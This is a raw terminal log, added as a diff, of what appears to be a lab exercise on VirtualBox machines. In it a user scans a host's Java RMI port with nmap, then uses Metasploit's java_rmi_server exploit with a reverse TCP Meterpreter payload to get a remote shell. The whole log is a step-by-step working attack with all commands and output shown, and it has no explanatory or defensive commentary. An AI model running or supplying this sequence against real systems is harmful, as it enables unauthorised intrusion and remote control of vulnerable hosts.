@@ -1,0 +1,219 @@
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ ip addr                                                                                                                     1: ~
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:f1:de:c2 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
+       valid_lft 84067sec preferred_lft 84067sec
+    inet6 fd00::2d3a:4a8b:622f:62a2/64 scope global dynamic noprefixroute 
+       valid_lft 86026sec preferred_lft 14026sec
+    inet6 fe80::18d4:3527:2b3c:35cb/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:67:8b:59 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.50.172/24 brd 192.168.50.255 scope global dynamic noprefixroute eth1
+       valid_lft 4999sec preferred_lft 4999sec
+    inet6 fe80::7bcb:be37:4075:3f45/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+4: eth2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:7a:8e:4a brd ff:ff:ff:ff:ff:ff
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ sudo ip addr add 192.168.11.111/24 dev eth1                                                                                 1: ~
+
+[sudo] password di sushanto: 
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ sudo ip route add default via 192.168.11.1 dev eth1                                                                         1: ~
+
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ ip addr show dev eth1                                                                                                       1: ~
+
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:67:8b:59 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.50.172/24 brd 192.168.50.255 scope global dynamic noprefixroute eth1
+       valid_lft 4702sec preferred_lft 4702sec
+    inet 192.168.11.111/24 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::7bcb:be37:4075:3f45/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ ping 192.168.11.112                                                                                                         1: ~
+PING 192.168.11.112 (192.168.11.112) 56(84) bytes of data.
+64 bytes from 192.168.11.112: icmp_seq=1 ttl=64 time=0.771 ms
+64 bytes from 192.168.11.112: icmp_seq=2 ttl=64 time=0.276 ms
+64 bytes from 192.168.11.112: icmp_seq=3 ttl=64 time=0.368 ms
+64 bytes from 192.168.11.112: icmp_seq=4 ttl=64 time=0.348 ms
+^C
+--- 192.168.11.112 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3033ms
+rtt min/avg/max/mdev = 0.276/0.440/0.771/0.193 ms
+                                                                                                                                     
+┌──(sushanto㉿Sushanto-Kali64)-[~]
+└─$ msfconsole                                                                                                                  1: ~
+
+Metasploit tip: Use sessions -1 to interact with the last opened session
+                                                  
+
+         .                                         .                                                                                 
+ .                                                                                                                                   
+                                                                                                                                     
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o                                                                    
+       '   dB'                     BBP                                                                                               
+    dB'dB'dB' dBBP     dBP     dBP BB                                                                                                
+   dB'dB'dB' dBP      dBP     dBP  BB                                                                                                
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                                                                                
+                                                                                                                                     
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                                                      
+          .                  .                  dB' dBP    dB'.BP                                                                    
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP                                                          
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                                                           
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                                                            
+                                                                                                                                     
+                                                                    .                                                                
+                .                                                                                                                    
+        o                  To boldly go where no                                                                                     
+                            shell has gone before                                                                                    
+                                                                                                                                     
+
+       =[ metasploit v6.4.20-dev                          ]
++ -- --=[ 2440 exploits - 1256 auxiliary - 429 post       ]
++ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > sudo nmap -O -sV -p 1099 192.168.11.112
+[*] exec: sudo nmap -O -sV -p 1099 192.168.11.112
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 14:33 CEST
+Nmap scan report for 192.168.11.112
+Host is up (0.00059s latency).
+
+PORT     STATE SERVICE  VERSION
+1099/tcp open  java-rmi GNU Classpath grmiregistry
+MAC Address: 08:00:27:C5:97:8C (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.71 seconds
+msf6 > search java_rmi
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  auxiliary/gather/java_rmi_registry              .                normal     No     Java RMI Registry Interfaces Enumeration
+   1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
+   2    \_ target: Generic (Java Payload)             .                .          .      .
+   3    \_ target: Windows x86 (Native Payload)       .                .          .      .
+   4    \_ target: Linux x86 (Native Payload)         .                .          .      .
+   5    \_ target: Mac OS X PPC (Native Payload)      .                .          .      .
+   6    \_ target: Mac OS X x86 (Native Payload)      .                .          .      .
+   7  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner
+   8  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/multi/browser/java_rmi_connection_impl
+
+msf6 > use 1
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
+                                         asploit.html
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local mac
+                                         hine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.11.111   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/java_rmi_server) > set rhost 192.168.11.112
+rhost => 192.168.11.112
+msf6 exploit(multi/misc/java_rmi_server) > set lhost 192.168.11.111
+lhost => 192.168.11.111
+msf6 exploit(multi/misc/java_rmi_server) > run
+
+[*] Started reverse TCP handler on 192.168.11.111:4444 
+[*] 192.168.11.112:1099 - Using URL: http://192.168.11.111:8080/Gr20p1JFHT7DBM
+[*] 192.168.11.112:1099 - Server started.
+[*] 192.168.11.112:1099 - Sending RMI Header...
+[*] 192.168.11.112:1099 - Sending RMI Call...
+[*] 192.168.11.112:1099 - Replied to request for payload JAR
+[*] Sending stage (57971 bytes) to 192.168.11.112
+[*] Meterpreter session 1 opened (192.168.11.111:4444 -> 192.168.11.112:48236) at 2024-09-27 14:36:36 +0200
+
+meterpreter > ip a
+[-] Unknown command: ip. Run the help command for more details.
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo - lo
+Hardware MAC : 00:00:00:00:00:00
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ::
+
+
+Interface  2
+============
+Name         : eth0 - eth0
+Hardware MAC : 00:00:00:00:00:00
+IPv4 Address : 192.168.11.112
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a00:27ff:fec5:978c
+IPv6 Netmask : ::
+
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+rout -n
+/bin/sh: line 1: rout: command not found
+netstat -nr
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+192.168.11.0    0.0.0.0         255.255.255.0   U         0 0          0 eth0
+0.0.0.0         192.168.11.1    0.0.0.0         UG        0 0          0 eth0
+
